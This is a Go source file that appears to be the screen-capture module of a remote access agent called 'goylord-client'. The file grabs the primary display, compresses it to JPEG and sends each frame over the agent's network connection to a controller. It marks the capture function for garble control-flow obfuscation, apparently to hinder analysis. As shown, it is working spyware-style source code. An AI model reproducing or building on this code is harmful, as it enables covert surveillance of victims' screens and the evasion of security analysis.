package main

import (
	"bytes"
	"context"
	"image"
	"image/jpeg"

	"goylord-client/cmd/agent/capture"
	rt "goylord-client/cmd/agent/runtime"
	"goylord-client/cmd/agent/wire"
)

func captureLoop(ctx context.Context, env *rt.Env) {

	if supportsCapture() {
		_ = captureAndSend(ctx, env)
	}

	<-ctx.Done()
}

func supportsCapture() bool {

	return safeDisplayCount() > 0
}

func captureAndSend(ctx context.Context, env *rt.Env) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	if safeDisplayCount() == 0 {
		return nil
	}
	img, err := safeCaptureDisplay(0)
	if err != nil {
		return err
	}
	if img == nil {
		return nil
	}

	buf := bytes.Buffer{}
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 60}); err != nil {
		return err
	}
	frame := wire.Frame{
		Type:   "frame",
		Header: wire.FrameHeader{Monitor: 0, FPS: 1, Format: "jpeg"},
		Data:   buf.Bytes(),
	}
	return wire.WriteMsg(ctx, env.Conn, frame)
}

func CaptureNow(ctx context.Context, env *rt.Env) error {
	if !supportsCapture() {
		return nil
	}
	return captureAndSend(ctx, env)
}

func safeCaptureDisplay(display int) (*image.RGBA, error) {
	return capture.CaptureDisplayRGBA(display)
}

func safeDisplayCount() int {
	return capture.MonitorCount()
}

func monitorCount() int {
	n := safeDisplayCount()
	if n <= 0 {

		return 1
	}
	return n
}
